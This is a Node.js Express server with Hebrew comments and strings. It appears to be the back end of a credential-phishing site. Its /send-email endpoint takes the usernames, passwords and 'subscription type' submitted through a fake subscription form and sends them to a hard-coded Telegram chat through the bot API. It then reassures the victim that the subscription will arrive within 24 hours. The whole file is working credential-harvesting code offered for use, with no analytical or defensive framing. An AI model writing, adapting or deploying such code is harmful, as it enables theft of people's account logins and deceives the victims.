const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());

app.use(express.static(__dirname));

// הכנס כאן את הטוקן המדויק של Mikmak_mikmak_bot מ-BotFather
const TELEGRAM_BOT_TOKEN = 'הדבק_כאן_את_הטוקן_של_Mikmak_mikmak_bot';
const TELEGRAM_CHAT_ID = '7519574690';

function sendToTelegram(username, password, subscription, res) {
    const message = `🔐 תזכורת פרטי התחברות חדשים מהאתר:\n\n⭐ סוג מנוי: ${subscription}\n👤 שם משתמש: ${username}\n🔑 סיסמה: ${password}`;

    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const telegramReq = https.request(options, (telegramRes) => {
        let responseBody = '';
        
        telegramRes.on('data', (chunk) => {
            responseBody += chunk;
        });

        telegramRes.on('end', () => {
            console.log('Telegram API response: ' + responseBody);
            if (res) {
                res.send('המנוי יתקבל בעוד 24 שעות');
            }
        });
    });

    telegramReq.on('error', (error) => {
        console.error('Telegram Error:', error);
        if (res) {
            res.send('שגיאה נסה שוב עוד 24 שעות');
        }
    });

    telegramReq.write(data);
    telegramReq.end();
}

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/send-email', (req, res) => {
    console.log('--> התקבלה בקשת שליחה חדשה מהאתר!');
    const username = req.body.username || 'לא צויין';
    const password = req.body.password || 'לא צויין';
    const subscription = req.body.subscription || 'לא צויין';

    sendToTelegram(username, password, subscription, res);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`השרת פעיל בהצלחה בפורט ${PORT}`);
});
